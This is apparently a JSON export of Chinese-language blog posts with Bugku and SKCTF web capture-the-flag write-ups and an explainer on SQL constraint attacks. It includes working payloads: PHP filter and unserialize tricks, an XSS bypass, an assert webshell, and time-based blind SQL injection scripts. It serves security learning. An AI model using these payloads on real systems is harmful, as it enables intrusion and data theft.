load_image($imagekey);$w = imagesx($im);$h = imagesy($im);if($w &gt; MAX_IM_SIZE || $h &gt; MAX_IM_SIZE) fatal(\"Invalid image dimensions.\");?&gt;&lt;center&gt;&lt;div class=\"article\"&gt; &lt;h2&gt;&lt;/h2&gt; &lt;p&gt;&lt;img src=\"uploads/&lt;?=$imagekey;?&gt;.png\" /&gt; &lt;div&gt; &lt;a href=\"uploads/&lt;?=$imagekey;?&gt;.png\"&gt;View saved image&lt;/a&gt; &lt;/div&gt;&lt;/div&gt;&lt;/center&gt; 看不出所以然，即使最后上传成功文件，也没显示flag，那么直接输入op=flag，发现没有提示错误，说明有这个文件，那么就同样利用php://filter读取源代码 http://120.24.86.145:9011/?op=php://filter/read=convert.base64-encode/resource=flag 解码得 123&lt;?php $flag=\"flag&#123;e00f8931037cbdb25f6b1d82dfe5552f&#125;\"; ?&gt;","categories":[{"name":"Bugkuctf-Web","slug":"Bugkuctf-Web","permalink":"https://Foxgrin.github.io/categories/Bugkuctf-Web/"}],"tags":[{"name":"ctf","slug":"ctf","permalink":"https://Foxgrin.github.io/tags/ctf/"}]},{"title":"sql约束攻击","slug":"sql约束攻击","date":"2018-08-04T08:58:00.000Z","updated":"2018-08-06T03:45:00.811Z","comments":true,"path":"/posts/22848/","link":"","permalink":"https://Foxgrin.github.io/posts/22848/","excerpt":"做ctf的题时刚好做到要用sql约束攻击的题，赶紧去看看别人的文章学习一下这种攻击","text":"做ctf的题时刚好做到要用sql约束攻击的题，赶紧去看看别人的文章学习一下这种攻击 题目大致上是一个登陆界面和一个注册界面，需要我们用管理员的身份登陆才能拿到flag值 登陆页面： 12345678910111213141516171819&lt;?phpinclude('connection.php');if(isset($_POST['username']) &amp;&amp; isset($_POST['password']))&#123; $username = mysql_real_escape_string($_POST['username']); $password = mysql_real_escape_string($_POST['password']); $sql = \"SELECT username,password FROM users WHERE username='$username' AND password='$password'\"; $result = mysql_query($sql); $row = mysql_fetch_array($result); if($row)&#123; echo 'hello '.$username; &#125; else&#123; echo 'username was not exist or password was wrong'; &#125;&#125;?&gt; 注册页面： 12345678910111213141516171819202122&lt;?phpinclude('connection.php');if(isset($_POST['username']) &amp;&amp; isset($_POST['password']))&#123; $username = mysql_real_escape_string($_POST['username']); $password = mysql_real_escape_string($_POST['password']); $sql = \"SELECT username FROM users WHERE username='$username'\"; $result = mysql_query($sql); $row = mysql_fetch_array($result); if($row)&#123; die('username has exist'); &#125; else&#123; $sql = \"INSERT INTO users(username,password) values('$username','$password')\"; $result = mysql_query($sql); echo 'regist successfully'; header('location:login.php'); &#125;&#125;?&gt; 看似对用户的输入进行了转义的过滤，能防止sql注入，但是我们还是有办法能登录任意已存在的账号 下面演示具体过程： 首先先创建一个数据库test，再test库下建立users表，里面的列名为username和password 注意这里对用户名和密码字符串长度限制最大为15位 接着创建一个管理员身份账户，用户名为admin，密码为123456 然后我们以攻击者的身份要以管理员身份登陆，首先注册用户，用户名为admin+若干个空格+1，这里空格在10个以上，原因后面会提到 这时候我们注册页面首先会进行是否存在注册的用户名的查询 没有查询到结果，所以成功绕过了查询，这里就可以解释一下为什么要在末尾加1，其实1是随便加的，任何字母数字都可以，原因是mysql进行select查询时，会忽略末尾的若干个空格，例如我们执行sql语句：”select username,password from users where username=’admin ‘ “ 结果跟没有加空格是一样的，那么我们要绕过是否存在用户名的查询，如果只在末尾加空格，是会被检测到存在admin用户，所以我们在末尾加个任意字符，就可以绕过这个查询 那么为什么空格要在10个以上呢，我们继续看下去 下面注册页面执行的是insert语句 可见成功的注册了 我们再来查询一下”select username,password from users where username=’admin’ “ 这时候发现有两个admin用户，但是这两个用户其实是不一样的，因为我们之前说过了，mysql在select查询时会将末尾空格忽略，而mysql在insert操作时不会忽略空格，也就是说我们以攻击者身份注册的用户名’admin 1’中的空格不会被省略，这里肯定就有疑问，那么1跑哪里去了，答案很简单，我们之前就已经限制了username的最大长度为15，这里空格在10个以上，加上admin的5个长度，所以长度在15以上的字符就被截断了，之前的才会被写入数据库，那么实际上写入数据库的就是admin+10个空格，但是我们登录查询select语句会自动忽略空格，所以将后面没有空格的admin和加了10个空格的admin都查询了出来 也就是说，我们在登录页面输入用户名为admin，密码为aaa，就会有查询结果，也就以管理员身份登录成功了 当然我们查询到的并不是真正的admin用户，但是服务器只检测有没有查询结果，有则认为我们登录成功 那么防御手段也挺简单就能想到，我们只需要对查询的结果进行检查，检查查询到的用户密码是不是之前设置的管理员密码，就可以防御了 最后附上参考链接：https://www.cnblogs.com/ECJTUACM-873284962/p/8977983.html","categories":[{"name":"sql","slug":"sql","permalink":"https://Foxgrin.github.io/categories/sql/"}],"tags":[{"name":"sql","slug":"sql","permalink":"https://Foxgrin.github.io/tags/sql/"}]},{"title":"Bugkuctf-Web(2)","slug":"Bugkuctf-Web(2)","date":"2018-08-02T14:48:00.000Z","updated":"2018-08-06T03:45:00.809Z","comments":true,"path":"/posts/26423/","link":"","permalink":"https://Foxgrin.github.io/posts/26423/","excerpt":"Bugkuctf中的Web题解(二)","text":"Bugkuctf中的Web题解(二) cookies欺骗网址：http://120.24.86.145:8002/web11/ 进去页面一看是一串乱码，但发现url中包含参数filename=a2V5cy50eHQ=，将a2V5cy50eHQ=进行base64解码得keys.txt，将index.php进行base64加密后赋值给filename参数，同时指定line参数的值为1，发现输出了php代码 于是猜测line为行数，写个脚本读出index.php的所有代码 1234567import requestsfor i in range(0,100): url = 'http://120.24.86.145:8002/web11/index.php?line=%d&amp;filename=aW5kZXgucGhw'%i r = requests.get(url) if r.text: print(r.text,end='') 结果： 12345678910111213141516171819202122232425262728293031323334353637&lt;?phperror_reporting(0);$file=base64_decode(isset($_GET[&apos;filename&apos;])?$_GET[&apos;filename&apos;]:&quot;&quot;);$line=isset($_GET[&apos;line&apos;])?intval($_GET[&apos;line&apos;]):0;if($file==&apos;&apos;) header(&quot;location:index.php?line=&amp;filename=a2V5cy50eHQ=&quot;);$file_list = array(&apos;0&apos; =&gt;&apos;keys.txt&apos;,&apos;1&apos; =&gt;&apos;index.php&apos;,); if(isset($_COOKIE[&apos;margin&apos;]) &amp;&amp; $_COOKIE[&apos;margin&apos;]==&apos;margin&apos;)&#123;$file_list[2]=&apos;keys.php&apos;;&#125; if(in_array($file, $file_list))&#123;$fa = file($file);echo $fa[$line];&#125;?&gt; 从源代码可以看出，flag在keys.php中，而我们要逐行读取keys.php文件的内容，就必须设置cookie:margin=margin 直接上脚本： 12345678910import requestscookie = &#123; 'margin':'margin' &#125;for i in range(0,100): url = 'http://120.24.86.145:8002/web11/index.php?line=%d&amp;filename=a2V5cy5waHA='%i r = requests.get(url,cookies=cookie) if r.text: print(r.text,end='') 结果： 1&lt;?php $key='KEY&#123;key_keys&#125;'; ?&gt; XSS注入测试网址：http://103.238.227.13:10089/ 页面提示我们要注入一段xss代码，看一下源代码 关键代码： 1234&lt;script&gt; var s=\"\"; document.getElementById('s').innerHTML = s;&lt;/script&gt; id为s的是一个为空的div标签 1&lt;div id=\"s\"&gt;&lt;/div&gt; 举个例子说明一下innerHTML 12345678&lt;a id=\"baidu\"&gt;&lt;strong&gt;百度&lt;/strong&gt;&lt;/a&gt; document.getElementById(\"baidu\") 获得 a 这个元素document.getElementById(\"baidu\") .innerHTML 获得 a 这个元素内的HTML代码（即&lt;strong&gt;百度&lt;/strong&gt;）document.getElementById(\"baidu\") .innerHTML = \"&lt;em&gt;谷歌&lt;/em&gt;\" 设置 a 这个元素内的HTML代码，设置后&lt;strong&gt;百度&lt;/strong&gt;就变为&lt;em&gt;谷歌&lt;/em&gt; 这里说明一下如果字符串中拼接的 HTML 标签中有 script 标签，那么该段脚本是无法执行的，这并不是 bug，而是 w3c 的文档规定的 再来看看这题，没有给出注入点，按照惯例是id，输入 1?id=&lt;script&gt;alert(_key_)&lt;/script&gt; 查看源代码 123&lt;script&gt; var s=\"&amp;lt;script&amp;gt;\"; document.getElementById('s').innerHTML = s;&lt;/script&gt; 发现&lt;&gt;被html编码，即被过滤了 因为页面编码为utf-8，所以可以将&lt;&gt;进行unicode编码，这样当代码被替换进去运行时，utf-8编码又会将其变回来 输入 1?id=\\u003cscript\\u003ealert(_key_)\\u003c/script\\u003e 返回： 1234&lt;script&gt; var s=\"\\u003cscript\\u003ealert('Flag:17f094325e90085b30a5ddefce34acd8')\\u003c/script\\u003e\";document.getElementById('s').innerHTML = s;&lt;/script&gt; 参考：https://blog.csdn.net/wy_97/article/details/77755098 never give up网址：http://120.24.86.145:8006/test/hello.php 页面源代码提示 1&lt;!--1p.html--&gt; 访问http://120.24.86.145:8006/test/1p.html，发现跳转到其他页面 那么访问其源代码view-source:http://120.24.86.145:8006/test/1p/html 1234567891011121314&lt;SCRIPT LANGUAGE=\"Javascript\"&gt;&lt;!--var Words =\"%3Cscript%3Ewindow.location.href%3D%27http%3A//www.bugku.com%27%3B%3C/script%3E%20%0A%3C%21--JTIyJTNCaWYlMjglMjElMjRfR0VUJTVCJTI3aWQlMjclNUQlMjklMEElN0IlMEElMDloZWFkZXIlMjglMjdMb2NhdGlvbiUzQSUyMGhlbGxvLnBocCUzRmlkJTNEMSUyNyUyOSUzQiUwQSUwOWV4aXQlMjglMjklM0IlMEElN0QlMEElMjRpZCUzRCUyNF9HRVQlNUIlMjdpZCUyNyU1RCUzQiUwQSUyNGElM0QlMjRfR0VUJTVCJTI3YSUyNyU1RCUzQiUwQSUyNGIlM0QlMjRfR0VUJTVCJTI3YiUyNyU1RCUzQiUwQWlmJTI4c3RyaXBvcyUyOCUyNGElMkMlMjcuJTI3JTI5JTI5JTBBJTdCJTBBJTA5ZWNobyUyMCUyN25vJTIwbm8lMjBubyUyMG5vJTIwbm8lMjBubyUyMG5vJTI3JTNCJTBBJTA5cmV0dXJuJTIwJTNCJTBBJTdEJTBBJTI0ZGF0YSUyMCUzRCUyMEBmaWxlX2dldF9jb250ZW50cyUyOCUyNGElMkMlMjdyJTI3JTI5JTNCJTBBaWYlMjglMjRkYXRhJTNEJTNEJTIyYnVna3UlMjBpcyUyMGElMjBuaWNlJTIwcGxhdGVmb3JtJTIxJTIyJTIwYW5kJTIwJTI0aWQlM0QlM0QwJTIwYW5kJTIwc3RybGVuJTI4JTI0YiUyOSUzRTUlMjBhbmQlMjBlcmVnaSUyOCUyMjExMSUyMi5zdWJzdHIlMjglMjRiJTJDMCUyQzElMjklMkMlMjIxMTE0JTIyJTI5JTIwYW5kJTIwc3Vic3RyJTI4JTI0YiUyQzAlMkMxJTI5JTIxJTNENCUyOSUwQSU3QiUwQSUwOXJlcXVpcmUlMjglMjJmNGwyYTNnLnR4dCUyMiUyOSUzQiUwQSU3RCUwQWVsc2UlMEElN0IlMEElMDlwcmludCUyMCUyMm5ldmVyJTIwbmV2ZXIlMjBuZXZlciUyMGdpdmUlMjB1cCUyMCUyMSUyMSUyMSUyMiUzQiUwQSU3RCUwQSUwQSUwQSUzRiUzRQ%3D%3D--%3E\" function OutWord()&#123;var NewWords;NewWords = unescape(Words);document.write(NewWords);&#125; OutWord();// --&gt;&lt;/SCRIPT&gt; 关键在于Words这个变量，第一行 1%3Cscript%3Ewindow.location.href%3D%27http%3A//www.bugku.com%27%3B%3C/script%3E%20%0A%3C%21 看起来像是被url编码过，url解码后： 12&lt;script&gt;window.location.href=&apos;http://www.bugku.com&apos;;&lt;/script&gt; &lt;!-- 后面是被注释的代码：先base64解码后url解码 12345678910111213141516171819202122if(!$_GET['id'])&#123; header('Location: hello.php?id=1'); exit();&#125;$id=$_GET['id'];$a=$_GET['a'];$b=$_GET['b'];if(stripos($a,'.'))&#123; echo 'no no no no no no no'; return ;&#125;$data = @file_get_contents($a,'r');if($data==\"bugku is a nice plateform!\" and $id==0 and strlen($b)&gt;5 and eregi(\"111\".substr($b,0,1),\"1114\") and substr($b,0,1)!=4)&#123; require(\"f4l2a3g.txt\");&#125;else&#123; print \"never never never give up !!!\";&#125; 看的出来这就是hello.php的源代码，这里出题人没有隐藏文件名，知道了文件名f4l2a3g.txt其实就可以直接访问 但是按照出题人的意思我们要绕过过滤，首先$data必须为”bugku is a nice plateform”，而$data值取决于函数file_get_contents，这里查询得知php后门技巧，利用php协议input，接收post的信息，经过函数file_get_contents就可以读取出来，所以$a=php://input，然后post字符串”bugku is a nice plateform” 接着是$id要等于0，但是代码开头如果$id为0则重定向，所以不能为0，利用php弱类型的特性可以给$id赋值0a 然后$b的检查长度大于5，正则匹配$b第一位必须为4，然而substr()检查$b第一位不能为4，自相矛盾，但是可以利用%00截断eregi函数 综上GET参数为?id=0a&amp;a=php://input&amp;b=%0012345 welcome to bugkuctf网址：http://120.24.86.145:8006/test1/ 进入页面查看源代码，发现提示了源代码 12345678910$user = $_GET[\"txt\"]; $file = $_GET[\"file\"]; $pass = $_GET[\"password\"]; if(isset($user)&amp;&amp;(file_get_contents($user,'r')===\"welcome to the bugkuctf\"))&#123; echo \"hello admin!&lt;br&gt;\"; include($file); //hint.php &#125;else&#123; echo \"you are not admin ! \"; &#125; 审计后GET参数?txt=php://input，POST数据”welcome to the bugkuctf” 之后就是文件包含漏洞，提示了hint.php，我们GET参数file=php://filter/read=convert.base64-encode/resource=hint.php查看hint.php的源代码 base64解码后得hint.php源代码： 12345678910111213&lt;?php class Flag&#123;//flag.php public $file; public function __tostring()&#123; if(isset($this-&gt;file))&#123; echo file_get_contents($this-&gt;file); echo \"&lt;br&gt;\"; return (\"good\"); &#125; &#125; &#125; ?&gt; 又提示了flag.php，猜测flag就在这里面，再试试能不能读取flag.php的源代码 貌似被过滤了flag.php 那就看看index.php的源代码吧 解码后得： 123456789101112131415161718192021222324252627282930313233&lt;?php $txt = $_GET[\"txt\"]; $file = $_GET[\"file\"]; $password = $_GET[\"password\"]; if(isset($txt)&amp;&amp;(file_get_contents($txt,'r')===\"welcome to the bugkuctf\"))&#123; echo \"hello friend!&lt;br&gt;\"; if(preg_match(\"/flag/\",$file))&#123; echo \"ä¸è½ç°å¨å°±ç»ä½ flagå¦\"; exit(); &#125;else&#123; include($file); $password = unserialize($password); echo $password; &#125; &#125;else&#123; echo \"you are not the number of bugku ! \"; &#125; ?&gt; &lt;!-- $user = $_GET[\"txt\"]; $file = $_GET[\"file\"]; $pass = $_GET[\"password\"]; if(isset($user)&amp;&amp;(file_get_contents($user,'r')===\"welcome to the bugkuctf\"))&#123; echo \"hello admin!&lt;br&gt;\"; include($file); //hint.php &#125;else&#123; echo \"you are not admin ! \"; &#125; --&gt; 果然文件包含被正则匹配过滤了关键词flag，我们要得到flag就必须读取flag.php文件，怎么办呢，想起来还有hint.php的提示，它定义了一个类，类里定义了一个全局变量$file，如果类对象全局变量有设置值，则用file_get_contents函数读取 这里还有一个password参数经过反序列化函数unserialize处理，首先要了解这个函数具体的作用，来看一个例子： 12345678910&lt;?php$a = array('a'=&gt;'apple','b'=&gt;'banana','c'=&gt;40);$s = serialize($a);echo $s;$b = unserialize($s);echo '&lt;br&gt;';print_r($b);?&gt; 运行结果： 大概清楚规律了，再看本题，要给参数password赋值一个被序列化的字符串，使password成为Flag类的参数file 有点难理解，再看一个例子： 123456789101112&lt;?phpclass Flag&#123; public $file;&#125;$a = new Flag;$a -&gt; file = 'flag.php';$a = serialize($a);echo $a;?&gt; 这个例子初始化了一个Flag对象a，并赋值’flag.php’，在进行序列化，得到的值就相当于我们给password赋值一个反序列化的Flag对象 结果： 综上，我们GET参数?txt=php://input&amp;file=hint.php&amp;password=O:4:”Flag”:1:{s:4:”file”;s:8:”flag.php”;} POST数据welcome to the bugkuctf 成功拿到flag 附上本题参考链接：https://www.cnblogs.com/Pinging/p/8278168.html 过狗一句话网址：http://120.24.86.145:8010/ 题目给出了提示代码： 12345678&lt;?php$poc=\"a#s#s#e#r#t\"; $poc_1=explode(\"#\",$poc);$poc_2=$poc_1[0].$poc_1[1].$poc_1[2].$poc_1[3].$poc_1[4].$poc_1[5]; $poc_2($_GET['s']);?&gt; 用assert语句执行任意命令 输入?s=print_r(scandir(‘./‘)) 扫描当前目前下所有文件 访问http://120.24.86.145:8010/f94lag.txt 获得flag 字符？正则？网址：http://120.24.86.145:8002/web10/ 代码审计题，代码如下： 12345678&lt;?php highlight_file('2.php');$key='KEY&#123;********************************&#125;';$IM= preg_match(\"/key.*key.&#123;4,7&#125;key:\\/.\\/(.*key)[a-z][[:punct:]]/i\", trim($_GET[\"id\"]), $match);if( $IM )&#123; die('key is: '.$key);&#125;?&gt; 匹配正则输出flag值 [:punct:]指任意标点符号 输入?id=keykeykkkkkey:/k/keyk. 获得flag 前女友(SKCTF)网址：http://118.89.219.210:49162/ 页面源代码给了提示链接 链接是一个code.txt文件，里面给出了提示代码： 123456789101112&lt;?phpif(isset($_GET['v1']) &amp;&amp; isset($_GET['v2']) &amp;&amp; isset($_GET['v3']))&#123; $v1 = $_GET['v1']; $v2 = $_GET['v2']; $v3 = $_GET['v3']; if($v1 != $v2 &amp;&amp; md5($v1) == md5($v2))&#123; if(!strcmp($v3, $flag))&#123; echo $flag; &#125; &#125;&#125;?&gt; 审计代码，熟悉的值不等，md5值相等，240610708和QNKCDZO 还要绕过strcmp，我们知道strcmp比较两个字符串相等时返回0，否则返回大于0或者小于0，我们要输出flag，必须让strcmp返回0，但是strcmp不能处理数组，会返回NULL 所以输入：?v1=240610708&amp;v2=QNKCDZO&amp;v3[] 拿到flag login1(SKCTF)网址：http://118.89.219.210:49163/ 一个登陆系统，包含了登陆界面和注册界面，注册用户后登陆发现要管理员账号才能看到flag 尝试了万能密码等等都不行，猜测是用了mysql_real_escape函数过滤用户输入，怎么办呢，题目给了提示，sql约束攻击，攻击原理我写在了另一篇文章里，这里就直接给出解题过程 猜测管理员账号是admin，因为注册admin账号，提示admin账号已经存在 注册账号admin 1，(尽量多一点空格)密码自行设置 注册成功来到登录界面，输入账号admin,密码是自行设置的那个密码 拿到flag，不行的话注册admin后面的空格再延长一点应该就可以了 你从哪里来网址：http://120.24.86.145:9009/from.php 什么都没有提示，源代码也只有一句话，are you from google 猜测要从google访问到该页面才能拿到flag 想起来http请求头的Referer字段值就代表从哪个页面访问到该页面 尝试一下，用burp抓包，在请求头位置添加一行Referer: https://www.google.com 果然，拿到了flag md5 collision(NUPT_CTF)网址：http://120.24.86.145:9009/md5.php md5碰撞，源代码应该是这样的： 123456789101112131415161718&lt;?php $md51 = md5('QNKCDZO'); $a = @$_GET['a']; $md52 = @md5($a); if(isset($a))&#123; if($a != 'QNKCDZO' &amp;&amp; $md51 == $md52)&#123; echo \"nctf&#123;***&#125;\"; &#125; else&#123; echo \"false!!!\"; &#125; &#125; else&#123; echo \"please input a\"; &#125; ?&gt; php在比较0e开头的字符串时会将其视作为科学计数法，所以无论0e后面是什么，0的多少次方还是0 附上md5加密后以0e开头的字符串 1234567891011121314151617181920212223QNKCDZO0e830400451993494058024219903391s878926199a0e545993274517709034328855841020s155964671a0e342768416822451524974117254469s214587387a0e848240448830537924465865611904s214587387a0e848240448830537924465865611904s878926199a0e545993274517709034328855841020s1091221200a0e940624217856561557816327384675s1885207154a0e509367213418206700842008763514 输入?a=s878926199a 得到flag 程序员本地网站网址：http://120.24.86.145:8002/localhost/ 题目给出提示要我们从本地访问，用burp抓包添加Referer:http://127.0.0.1，失败 想起头部还有一个字段X-Forwarded-For，代表了来源ip地址，添加X-Forwarded-For:127.0.0.1 获得flag 各种绕过网址：http://120.24.86.145:8002/web7/ 一道代码审计题 123456789101112131415161718&lt;?php highlight_file('flag.php'); $_GET['id'] = urldecode($_GET['id']); $flag = 'flag&#123;xxxxxxxxxxxxxxxxxx&#125;'; if (isset($_GET['uname']) and isset($_POST['passwd'])) &#123; if ($_GET['uname'] == $_POST['passwd']) print 'passwd can not be uname.'; else if (sha1($_GET['uname']) === sha1($_POST['passwd'])&amp;($_GET['id']=='margin')) die('Flag: '.$flag); else print 'sorry!'; &#125; 要求我们POST请求提交变量passwd和GET请求提交变量id和变量uname 变量uname和passwd不能相等但是两者sha1加密后完全相等，我们md5和sha1处理数组会返回NULL，且NULL===NULL，id的话让它等于’margin’就行，url解码还是原来的 附上payload 拿到flag web8网址：http://120.24.86.145:8002/web8/ 代码审计题 123456789101112131415&lt;?phpextract($_GET);if (!empty($ac))&#123;$f = trim(file_get_contents($fn));if ($ac === $f)&#123;echo \"&lt;p&gt;This is flag:\" .\" $flag&lt;/p&gt;\";&#125;else&#123;echo \"&lt;p&gt;sorry!&lt;/p&gt;\";&#125;&#125;?&gt; extract函数作用是将数组里的键名取出作为新的变量名，键名对应的键值赋值给响应的变量值 也就是说我们GET的参数ac和fn的值就是变量ac和变量fn的值，题目要求变量ac和变量f完全相等，变量f是变量fn经过file_get_contents得到的值，我们可以利用php://input，让file_get_contents读取字节流 payloads如下 拿到flag 细心网址：http://120.24.86.145:8002/web13/ 看到提示：想办法变成admin，大概是要以管理员身份访问之类的 页面伪造了404页面，两个链接也没有什么提示作用，尝试一下访问robots.txt 发现文件resusl.php 访问 发现下面有提示了一行代码 1if ($_GET[x]==$password) 大概要我们GET一个参数x，要等于变量password的值，想起来刚开始的提示变成admin，就试了一下GET?x=admin 拿到了flag 求getshell网址：http://120.24.86.145:8002/web9/ 需要我们上传一个图片文件，上传php文件提示 用burp抓包修改文件类型为图片类型，依然上传失败 猜测是对文件名和文件类型都有检查，想了很久不知道怎么做 看了别人的题解，发现要对Content-Type: multipart/form-data修改为Content-Type: Multipart/form-data 绕过过滤，再将文件名修改为php5(php的别名)，只有这个没有被过滤，再将文件类型修改为图片类型 具体为什么要这么做，找了好多文章都没有解释原因，暂时当成一个技巧记下来吧 INSERT INTO注入网址：http://120.24.86.145:8002/web15/ 给出了源码提示： 1234567891011121314151617181920212223242526272829&lt;?phperror_reporting(0);function getIp()&#123;$ip = '';if(isset($_SERVER['HTTP_X_FORWARDED_FOR']))&#123;$ip = $_SERVER['HTTP_X_FORWARDED_FOR'];&#125;else&#123;$ip = $_SERVER['REMOTE_ADDR'];&#125;$ip_arr = explode(',', $ip);return $ip_arr[0];&#125;$host=\"localhost\";$user=\"\";$pass=\"\";$db=\"\";$connect = mysql_connect($host, $user, $pass) or die(\"Unable to connect\");mysql_select_db($db) or die(\"Unable to select database\");$ip = getIp();echo 'your ip is :'.$ip;$sql=\"insert into client_ip (ip) values ('$ip')\";mysql_query($sql);?&gt; 过滤了逗号，并且是insert 注入 我们先来看一下insert注入方法，没有报错，没有查询，只能延时注入 有延迟，可以延时注入 可是过滤了逗号，就没办法用if语句了 但是还有一种判断执行语句：select case when 判断条件 then 执行语句1 else 执行语句2 end ok，成功延时，那么最后考虑注入的判断条件，正常来说是用substr函数一位一位的截取判断，但是我们之前实用的substr函数也都是需要用到逗号的，怎么办呢 get了另外一种substr函数的使用方法：substr(database() from 1 for 1) = substr(database(),1,1) 接下来只需要写个脚本注入就可以了 先注出数据库名： 123456789101112131415161718192021222324import requestsurl = 'http://120.24.86.145:8002/web15/'allString = '''1234567890~`!@#$%^&amp;*()-_=+[]&#123;&#125;;:'\"|\\,&lt;.&gt;/?qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM'''database = ''flag = 1for i in range(1,10): for j in allString: header = &#123; \"X-Forwarded-For\":\"1'+(select case when (ascii(substr(database() from %d for 1))=%d) then sleep(3) else 0 end))#\"%(i,ord(j)) &#125; r = requests.get(url,headers=header) t = r.elapsed.total_seconds() print('the time of '+j+' is '+str(t)) if t &gt;= 3: database = database + j print('the '+str(i)+' place of database is '+j) break elif t &lt; 3 and j == 'M': flag = 0 break if flag == 0 : breakprint('database:',database) 结果： 数据名为web15 注表名： 123456789101112131415161718192021222324import requestsurl = 'http://120.24.86.145:8002/web15/'allString = '''1234567890~`!@#$%^&amp;*()-_=+[]&#123;&#125;;:'\"|\\,&lt;.&gt;/?qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM'''table_name = ''flag = 1for i in range(1,20): for j in allString: header = &#123; \"X-Forwarded-For\":\"1'+(select case when (ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=database()) from %d for 1))=%d) then sleep(3) else 0 end))#\"%(i,ord(j)) &#125; r = requests.get(url,headers=header) t = r.elapsed.total_seconds() print('the time of '+j+' is '+str(t)) if t &gt;= 3 and t &lt; 4: table_name = table_name + j print('the '+str(i)+' place of table_name is '+j) break elif t &lt; 3 and j == 'M': flag = 0 break if flag == 0 : breakprint('table_name:',table_name) 这里需要考虑一下服务器有可能自身会延迟，所以我将延迟定在3秒到4秒内 结果： 表名：client_ip,flag 注flag表下的列名： 123456789101112131415161718192021222324import requestsurl = 'http://120.24.86.145:8002/web15/'allString = '''1234567890~`!@#$%^&amp;*()-_=+[]&#123;&#125;;:'\"|\\,&lt;.&gt;/?qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM'''column_name = ''flag = 1for i in range(1,20): for j in allString: header = &#123; \"X-Forwarded-For\":\"1'+(select case when (ascii(substr((select group_concat(column_name) from information_schema.columns where table_name='flag') from %d for 1))=%d) then sleep(3) else 0 end))#\"%(i,ord(j)) &#125; r = requests.get(url,headers=header) t = r.elapsed.total_seconds() print('the time of '+j+' is '+str(t)) if t &gt;= 3 and t &lt; 4: column_name = column_name + j print('the '+str(i)+' place of table_name is '+j) break elif t &lt; 3 and j == 'M': flag = 0 break if flag == 0 : breakprint('column_name:',column_name) 结果： 列名为flag 最后注出flag列下的信息 123456789101112131415161718192021222324import requestsurl = 'http://120.24.86.145:8002/web15/'allString = '''1234567890~`!@#$%^&amp;*()-_=+[]&#123;&#125;;:'\"|\\,&lt;.&gt;/?qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM'''flag = ''f = 1for i in range(1,30): for j in allString: header = &#123; \"X-Forwarded-For\":\"1'+(select case when (ascii(substr((select flag from flag) from %d for 1))=%d) then sleep(3) else 0 end))#\"%(i,ord(j)) &#125; r = requests.get(url,headers=header) t = r.elapsed.total_seconds() print('the time of '+j+' is '+str(t)) if t &gt;= 3 and t &lt; 4: flag = flag + j print('the '+str(i)+' place of table_name is '+j) break elif t &lt; 3 and j == 'M': f = 0 break if f == 0 : breakprint('flag:',flag) 最后的flag","categories":[{"name":"Bugkuctf-Web","slug":"Bugkuctf-Web","permalink":"https://Foxgrin.github.io/categories/Bugkuctf-Web/"}],"tags":[{"name":"ctf","slug":"ctf","permalink":"https://Foxgrin.github.io/tags/ctf/"}]},{"title":"Bugkuctf-Web(1)","slug":"Bugkuctf-Web(1)","date":"2018-07-31T07:58:00.000Z","updated":"2018-08-02T14:12:55.093Z","comments":true,"path":"/posts/38711/","link":"","permalink":"https://Foxgrin.github.io/posts/38711/","excerpt":"Bugkuctf中的Web题解(一)","text":"Bugkuctf中的Web题解(一) web2网址：http://120.24.86.145:8002/web2/ 页面提示听说聪明人都能找到答案，进去页面一堆滑稽表情，看一下源代码，就可以拿到flag 文件上传测试网址：http://103.238.227.13:10085/ 这是一个文件上传的页面，要求我们上传一个php文件，文件大小不得超过1M 我们随便上传一个php文件试试 提示上传的不是图片文件 我们再试着上传一个图片文件 又提示我们不是PHP文件 这很明显自相矛盾了，我们再看看提示，一定要上传一个php文件才可能拿到flag 利用burp分别抓取上传php文件和图片的包 试着将上传php文件的文件格式修改为图片的文件格式 意外发现拿到了flag 再试着将上传png文件的文件后缀更改为php后缀 也同样拿到了flag 所以猜测这题后台应该首先对文件类型进行检测，如果不是图片的类型，则输出”非图片文件” 如果是图片类型，再检测文件名，如果是php文件，则输出flag，不是则输出”非php文件” 因此猜测后台代码如下： 123456789101112131415&lt;?phpif(isset($_POST[&apos;Submit&apos;]))&#123; if($_FILES[&apos;file&apos;][&apos;type&apos;] !== &apos;image/png&apos;)&#123; die(&apos;not png file&apos;); &#125; if(!preg_match(&quot;/\\.php/&quot;,$_FILES[&apos;file&apos;][&apos;name&apos;]))&#123; die(&apos;not PHP file&apos;); &#125; else&#123; die(&apos;flag:xxx&apos;); &#125;&#125;?&gt; 计算器网址：http://120.24.86.145:8002/yanzhengma/ 一道计算题，貌似提交正确答案就能获得flag，但是限制了输入文本框的长度，修改源代码的输入长度，输入正确答案，即可得到flag web基础$_GET网址：http://120.24.86.145:8002/get/ 代码如下： 1234567891011&lt;?php if(isset($_GET['what']))&#123; $what = $_GET['what']; echo $what; if($what == 'flag')&#123; echo 'flag&#123;***&#125;'; &#125; &#125; ?&gt; 浏览器通过GET方式请求，提交给服务器一个what参数，如果值为flag，则输出flag值 web基础$_POST网址：http://120.24.86.145:8002/post/ 代码如下： 1234567891011&lt;?php if(isset($_POST['what']))&#123; $what = $_GET['what']; echo $what; if($what == 'flag')&#123; echo 'flag&#123;***&#125;'; &#125; &#125; ?&gt; 浏览器通过POST方式请求，提交给服务器一个what参数，如果值为flag，则输出flag值 123456789&gt;&gt;&gt; import requests&gt;&gt;&gt; url = 'http://120.24.86.145:8002/post/'&gt;&gt;&gt; data =&#123; 'what':'flag' &#125;&gt;&gt;&gt; r = requests.post(url,data=data)&gt;&gt;&gt; r.text\"$what=$_POST['what'];&lt;br&gt;\\r\\necho $what;&lt;br&gt;\\r\\nif($what=='flag')&lt;br&gt;\\r\\necho 'flag&#123;****&#125;';&lt;br&gt;\\r\\n\\r\\n\\r\\nflagflag&#123;bugku_get_ssseint67se&#125;\"&gt;&gt;&gt; 矛盾网址：http://120.24.86.145:8002/get/index1.php 源代码如下： 12345678910111213&lt;?php if(isset($_GET['num']))&#123; $num = $_GET['num']; if(!is_numeric($num))&#123; echo $num; if($num == 1)&#123; echo 'flag&#123;xxx&#125;'; &#125; &#125; &#125; ?&gt; 